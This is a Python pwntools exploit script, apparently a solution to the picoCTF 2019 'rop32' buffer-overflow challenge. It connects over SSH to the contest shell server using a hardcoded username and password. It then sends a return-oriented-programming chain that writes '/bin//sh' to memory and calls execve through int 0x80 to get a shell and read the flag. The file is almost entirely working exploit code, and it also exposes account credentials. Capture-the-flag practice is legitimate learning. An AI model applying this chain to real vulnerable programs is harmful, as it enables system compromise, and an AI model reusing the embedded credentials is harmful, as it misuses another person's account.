from pwn import *

#p = process("./vuln")
s = ssh(host='2019shell1.picoctf.com', user='ChaaO', password='kmz317xe92')
p = s.process("vuln", cwd="/problems/rop32_4_0636b42072627d283f46d2427804b10c")
# 0x080481c9 pop ebx ; ret

payload = ''
payload += 'A' * 28
#payload += p32(0x0806ee6b) # pop edx ; ret
#payload += p32(0x080da060) # @ .data
#payload += p32(0x080a8e36) # pop eax ; ret
payload += p32(0x08056334) # pop eax ; pop edx ; pop ebx ; ret
payload += '/bin' # ngisi eax buat dikirim ke edx
payload += p32(0x080da060) # @ .data
payload += "JUNK" # ngisi ebx
payload += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
#payload += p32(0x0806ee6b) # pop edx ; ret
#payload += p32(0x080da064) # @ .data + 4
#payload += p32(0x080a8e36) # pop eax ; ret
payload += p32(0x08056334) # pop eax ; pop edx ; pop ebx ; ret
payload += '//sh' # ngisi eax buat dikirim ke edx
payload += p32(0x080da064) # @ .data + 4
payload += "JUNK" # ngisi ebx
payload += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
payload += p32(0x0806ee6b) # pop edx ; ret
payload += p32(0x080da068) # @ .data + 8
payload += p32(0x08056420) # xor eax, eax ; ret
payload += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
payload += p32(0x080481c9) # pop ebx ; ret
payload += p32(0x080da060) # @ .data
payload += p32(0x0806ee92) # pop ecx ; pop ebx ; ret
payload += p32(0x080da068) # @ .data + 8
payload += p32(0x080da060) # padding without overwrite ebx
payload += p32(0x0806ee6b) # pop edx ; ret
payload += p32(0x080da068) # @ .data + 8
payload += p32(0x08056420) # xor eax, eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x08049563) # int 0x80

#gdb.attach(p, """
#            b *vuln+55
#            c
#            """)

p.sendline(payload)
p.sendline("cat flag.txt")
p.interactive()